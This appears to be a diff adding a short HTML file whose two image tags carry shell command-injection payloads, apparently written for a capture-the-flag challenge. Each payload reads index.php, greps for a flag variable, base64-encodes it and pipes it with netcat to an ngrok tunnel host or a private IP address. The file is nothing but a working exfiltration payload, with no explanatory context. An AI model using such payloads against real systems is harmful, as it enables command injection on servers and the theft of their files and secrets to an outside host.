@@ -1,0 +1,4 @@
+<HTML>
+    <img src="$(cat index.php|grep \$flag|base64|nc -q 1 6.tcp.ngrok.io 18796)">
+    <img src="$(cat index.php|grep \$flag|base64|nc -q 1 192.168.1.35)">
+</HTML>
